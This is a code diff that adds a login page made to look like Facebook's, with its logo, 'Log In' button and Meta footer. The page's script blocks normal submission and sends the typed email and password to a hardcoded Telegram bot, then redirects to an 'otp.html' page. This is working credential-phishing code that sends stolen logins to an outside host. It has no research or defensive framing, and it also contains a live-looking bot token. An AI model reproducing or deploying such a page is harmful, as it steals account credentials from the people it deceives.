@@ -1,1 +1,136 @@
-<h1>Hello World</h1>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Log In</title>
+    <style>
+        body {
+            text-align: center;
+        }
+
+        @font-face {
+            font-family: Roboto-Regular;
+            src: url(https://cdn.glitch.global/85c73400-2c34-44c4-b3e4-fbf71852623a/Roboto-Regular.ttf?v=1674256335133);
+        }
+
+        * {
+            font-family: Roboto-Regular;
+        }
+
+        .signupbtn {
+            width: 300px;
+            height: 40px;
+            border-radius: 5px;
+            border: solid 1px blue;
+            font-size: 17px;
+            font-weight: bold;
+            color: white;
+            background-color: blue;
+            margin-bottom: 10px;
+        }
+
+        input {
+            width: 300px;
+            height: 43px;
+            margin-bottom: 10px;
+            padding-left: 10px;
+            border-radius: 5px;
+            border: solid 1px grey;
+            font-size: 15px;
+            box-sizing: border-box; /* Added to consider padding in width calculation */
+        }
+
+        txt {
+            color: blue;
+            font-size: 15px;
+        }
+
+        .horizontal-line {
+            border: none;
+            border-top: 1px solid #ccc;
+            margin: 20px 0;
+        }
+
+        .create-account {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .footer {
+            font-size: 12px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <center>
+        <form id="dataForm">
+            <div class="container">
+                <h1></h1>
+                <p></p>
+                <br>
+                <img src="https://cdn.glitch.global/85c73400-2c34-44c4-b3e4-fbf71852623a/facebook.png?v=1674256051418" width="130px"/>
+                <br>
+                <br>
+                <input type="text" placeholder="Mobile number or email address" name="email" required>
+                <br>
+                <input type="password" placeholder="Password" name="password" required>
+                <br>
+                <div class="clearfix">
+                    <button type="submit" class="signupbtn">Log In</button>
+                </div>
+            </div>
+            <txt>
+                Forgotten password?
+            </txt>
+            <hr class="horizontal-line">
+            <div class="create-account">
+                <txt style=" border-radius: 5px; border: 1px solid black; padding-left: 5px; padding-right: 5px; color: black;">Create New Account</txt>
+            </div>
+            <div class="footer">
+                <br><br><br><br><br><br>
+                <txt style="font-size: 14px; color: grey; margin-right: 222px;">English (UK)</txt><br><br><br><br>About . Help . More <br><br>Meta &#169; 2023
+            </div>
+        </form>
+    </center>
+    <script>
+        document.getElementById('dataForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the form from submitting normally
+
+            // Get form data
+            var formData = new FormData(this);
+
+            // Construct the message
+            var message = "New submission:\n";
+            formData.forEach(function(value, key){
+                message += key + ': ' + value + '\n';
+            });
+
+            // Send data to Telegram bot
+            var telegramBotAPIKey = '6607938692:AAG_H2iO6YBKdAwpGzn41EaPfy90lq7Isxc';
+            var chatId = '7026430464';
+            var url = 'https://api.telegram.org/bot' + telegramBotAPIKey + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
+
+            fetch(url)
+                .then(function(response) {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(function(data) {
+                    console.log(data);
+                    // Redirect to a different page
+                    window.location.href = 'otp.html';
+                })
+                .catch(function(error) {
+                    console.error('There was a problem with your fetch operation:', error);
+                    alert('An error occurred while submitting data.');
+                });
+        });
+    </script>
+</body>
+</html>
